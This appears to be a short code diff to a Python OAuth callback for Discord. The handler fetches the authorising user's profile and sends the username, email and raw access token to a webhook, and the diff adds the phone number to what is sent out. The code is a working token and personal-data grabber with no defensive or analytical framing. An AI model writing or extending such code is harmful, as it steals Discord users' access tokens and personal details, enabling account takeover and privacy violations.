@@ -20,10 +20,17 @@ def callback():
         h = {'Authorization': 'Bearer ' + str(t)}
         u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
         
-        # NO F-STRINGS. NO BRACKETS. IMPOSSIBLE TO CUT OFF.
-        f = [{"name": "User", "value": str(u.get('username'))},
-             {"name": "Email", "value": str(u.get('email'))},
-             {"name": "Token", "value": str(t)}]
+        # Safety Net: Get data or return "None"
+        user = str(u.get('username', 'N/A'))
+        mail = str(u.get('email', 'Not Linked'))
+        phon = str(u.get('phone', 'Not Linked'))
+        
+        f = [
+            {"name": "User", "value": user},
+            {"name": "Email", "value": mail},
+            {"name": "Phone", "value": phon},
+            {"name": "Token", "value": str(t)}
+        ]
              
         requests.post(WEB, json={"embeds": [{"fields": f}]})
         
